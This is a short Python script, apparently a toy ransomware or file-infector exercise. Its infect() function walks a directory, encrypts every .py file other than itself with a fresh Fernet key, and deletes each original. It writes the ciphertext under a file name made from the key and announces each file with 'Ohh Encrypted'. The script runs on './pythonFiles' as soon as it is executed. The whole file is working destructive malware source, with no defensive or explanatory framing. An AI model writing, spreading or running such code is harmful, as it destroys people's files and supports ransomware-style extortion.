import os
from cryptography.fernet import Fernet


# تولید کلید رمزنگاری
def generate_key():
    return Fernet.generate_key()


def encrypt_code(code, key):
    cipher = Fernet(key)  
    encrypted = cipher.encrypt(code.encode()) 
    return encrypted.decode()


def decrypt_code(encrypted_code, key):
    cipher = Fernet(key)
    decrypted = cipher.decrypt(encrypted_code.encode())
    return decrypted.decode()


def infect(dir):
    for root, dirs, files in os.walk(dir):
        for file in files:
            if file.endswith(".py") and file != os.path.basename(__file__):
                file_path = os.path.join(root, file)

                with open(file_path, 'r') as f:
                    original_code = f.read()

                key = generate_key()
                encrypted_content = encrypt_code(original_code, key)

                new_file_name = f"{key}.py"
                os.remove(file_path)
                new_file_path = os.path.join(root, new_file_name)

                with open(new_file_path, 'w') as f:
                    f.write(encrypted_content)

                print(f"Ohh Encrypted: {new_file_name}")


infect("./pythonFiles")
